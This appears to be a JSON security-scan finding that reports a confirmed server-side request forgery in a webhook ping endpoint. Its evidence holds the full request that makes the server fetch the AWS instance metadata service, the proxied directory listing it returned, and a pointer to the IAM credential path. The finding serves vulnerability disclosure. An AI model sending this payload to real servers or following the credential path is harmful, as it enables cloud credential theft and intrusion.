    {
      "id": "ionix-finding-007",
      "type": "ACTIVE_PROBE",
      "severity": "HIGH",
      "title": "Server-Side Request Forgery (SSRF) — Confirmed Outbound Request to Internal Metadata Service",
      "description": "Active probe confirmed that POST /api/v1/webhook/ping initiates outbound HTTP requests to attacker-controlled URLs. Probe request targeting the AWS Instance Metadata Service (http://169.254.169.254/latest/meta-data/) received a 200 response from the server, indicating the container made a successful outbound connection to the internal endpoint. Server response body contained the IMDS directory listing proxied through the application response.",
      "affected_asset": {
        "type": "ENDPOINT",
        "value": "https://api.techstride.io/api/v1/webhook/ping"
      },
      "discovery_method": "ACTIVE_PROBE",
      "evidence": {
        "request": {
          "method": "POST",
          "url": "https://api.techstride.io/api/v1/webhook/ping",
          "headers": {"Content-Type": "application/json"},
          "body": "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}"
        },
        "response": {
          "status": 200,
          "headers": {"Content-Type": "application/json"},
          "body": "{\"data\": {\"status\": 200, \"body\": \"ami-id\\nami-launch-index\\nami-manifest-path\\nhostname\\niam\\ninstance-action\\ninstance-id\\ninstance-life-cycle\\ninstance-type\\nlocal-hostname\\nlocal-ipv4\\nmac\\nmetrics\\nnetwork\\nplacement\\nprofile\\npublic-hostname\\npublic-ipv4\\npublic-keys\\nreservation-id\\nsecurity-groups\\nservices\"}, \"message\": \"Endpoint reachable\"}"
        },
        "out_of_band": {
          "dns_lookup": false,
          "http_response_received": true,
          "response_time_ms": 12,
          "notes": "Response body contains IMDS directory listing proxied through application response. Sub-15ms response consistent with same-VPC routing. IAM credential path: /latest/meta-data/iam/security-credentials/"
        }
      },
      "first_seen": "2026-07-01T14:22:07Z",
      "last_seen": "2026-07-02T10:00:00Z"
    },
